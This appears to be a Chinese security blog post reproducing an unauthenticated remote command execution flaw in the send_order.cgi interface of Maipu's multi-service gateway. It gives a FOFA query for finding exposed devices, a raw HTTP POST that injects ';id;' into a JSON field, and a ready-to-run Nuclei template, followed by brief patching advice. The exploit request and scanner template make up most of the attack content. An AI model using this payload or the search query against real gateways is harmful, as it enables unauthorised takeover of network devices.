#  漏洞复现 | 迈普多业务融合网关send_order.cgi远程命令执行漏洞【附poc】   
实战安全研究  实战安全研究   2024-07-01 21:22  
  
**免责声明**  
<table><tbody style="outline: 0px;visibility: visible;"><tr style="outline: 0px;visibility: visible;"><td valign="top" rowspan="5" colspan="1" style="outline: 0px;word-break: break-all;hyphens: auto;visibility: visible;"><strong style="outline: 0px;letter-spacing: 0.544px;color: rgb(255, 0, 0);font-size: 14px;visibility: visible;"><strong style="outline: 0px;color: rgb(62, 62, 62);letter-spacing: 0.544px;orphans: 4;text-align: left;visibility: visible;"><span style="outline: 0px;color: rgb(255, 0, 0);letter-spacing: 0.544px;visibility: visible;">本文仅用于技术学习和讨论。请勿使用本文所提供的内容及相关技术从事非法活动，由于传播、利用此文所提供的内容或工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果均与文章作者及本账号无关，本次测试仅供学习使用。如有内容争议或侵权，请及时私信我们！我们会立即删除并致歉。谢谢！</span></strong></strong></td></tr><tr style="outline: 0px;visibility: visible;"></tr><tr style="outline: 0px;visibility: visible;"></tr><tr style="outline: 0px;visibility: visible;"></tr><tr style="outline: 0px;visibility: visible;"></tr></tbody></table>  
**一、漏洞描述**  
  
迈普多业务融合网关是迈普通信技术股份有限公司自主研发的有线无线融合多业务网关，拥有有线无线网络一体配置、用户互联网网关、精准流控、上网行为管控、上网行为审计、网络安全防护、IPSec VPN分支互联、智能选路等强大功能，并支持对接迈普云平台，实现远程运维和集中管理。  
其接口  
send_order.cgi  
存在远程命令执行漏洞，  
未经身份验证  
的恶意攻击者  
可以任意命令，  
进而控制服务器系统  
。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF3y7z9KicwdgakuyTu43lQr2B4jbUWUNn6U0SfPM53m4ibSRXfDld5pm9IbMyoK0EB8oLnzL0Zqciagg/640?wx_fmt=png&from=appmsg "")  
## 二、网络测绘  
```
fofa：
title="迈普多业务融合网关"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF3y7z9KicwdgakuyTu43lQr2T53vicSdu4vpOMb8AYJWvrt8YsBKPoTu8PEp4MoUm2YfDicShPpNhPDg/640?wx_fmt=png&from=appmsg "")  
## 三、漏洞复现  
  
测试执行id命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zBdps5HcBF3y7z9KicwdgakuyTu43lQr2mKvQiaZlOFdFQjXGJvTPOpm1t3JIyeR4KZDt6O2WjRx08ruf2SC8r7Q/640?wx_fmt=png&from=appmsg "")  
  
**四、漏洞检测poc**  
```
POST /send_order.cgi?parameter=operation HTTP/1.1
Host: 0.0.0.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Content-Length: 40

{"opid":"1","name":";id;","type":"rest"}
```  
  
****  
**五、Nuclei 检测POC**  
```
id: Maipu_send_order_cgi_RCE

info:
  name: Maipu_send_order_cgi_RCE
  author: hamal
  severity: high
  description: 迈普多业务融合网关send_order.cgi远程命令执行漏洞
  reference:
    - https://
  tags: 微信公众号（实战安全研究）

http:
  - raw:
      - |-
        POST /send_order.cgi?parameter=operation HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.9
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
        Accept-Encoding: gzip, deflate
        Content-Length: 40

        {"opid":"1","name":";id;","type":"rest"}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"msg":"ok"'
      - type: status
        status:
          - 200

```  
  
关注公众号：  
**实战安全研究**  
  
公众号回复"**Nuclei**  
" 获取往期Nuclei漏洞POC  
  
**六、漏洞修复**  
  
1、建议联系厂商打补丁或升级版本。  
  
2、增加Web应用防火墙防护。  
  
3、  
关闭互联网暴露面或接口设置访问权限。  
  
